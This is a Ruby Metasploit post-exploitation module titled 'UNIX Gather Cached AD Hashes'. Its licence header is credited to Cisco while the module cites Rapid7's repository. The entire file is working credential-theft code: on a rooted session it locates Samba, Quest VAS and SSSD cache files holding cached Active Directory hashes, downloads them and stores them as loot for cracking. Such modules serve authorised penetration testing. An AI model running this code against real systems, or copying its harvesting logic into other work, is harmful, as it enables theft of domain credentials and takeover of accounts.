# Copyright (c) 2015-2018, Cisco International Ltd
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#     * Redistributions of source code must retain the above copyright
#       notice, this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice, this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * Neither the name of the Cisco International Ltd nor the
#       names of its contributors may be used to endorse or promote products
#       derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL CISCO INTERNATIONAL LTD BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Common

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'UNIX Gather Cached AD Hashes',
        'Description' => %q{ Post Module to obtain all cached AD hashes on the targeted UNIX machine. These can be cracked with John the Ripper (JtR). },
        'License' => MSF_LICENSE,
        'Author' => [ 'Tim Brown <timb[at]nth-dimension.org.uk>'],
        'Platform' => %w[linux osx unix solaris aix],
        'SessionTypes' => [ 'meterpreter', 'shell' ]
      )
    )
  end

  def run
    fail_with(Msf::Module::Failure::NoAccess, 'Must be running as root') unless is_root?
    print_status('Finding files')
    files = [ '/var/lib/samba/private/secrets.tdb', '/var/lib/samba/passdb.tdb', '/var/opt/quest/vas/authcache/vas_auth.vdb' ]
    files += cmd_exec('ls /var/lib/sss/db/cache_*').split(/\r\n|\r|\n/)
    files = files.select { |d| file?(d) }
    if files.nil? || files.empty?
      print_error('No cached AD hashes found')
      return
    end
    download_loot(files)
  end

  def download_loot(files)
    print_status("Looting #{files.count} files")
    files.each do |file|
      file.chomp!
      sep = '/'
      print_status("Downloading #{file}")
      data = read_file(file)
      file = file.split(sep).last
      loot_file = store_loot('unix_cached_ad_hashes', 'application/vnd.sqlite3', session, data, "unix_cached_ad_hashes_#{file}", 'Cached AD Hashes File')
      print_good("File stored in: #{loot_file}")
    end
  end
end
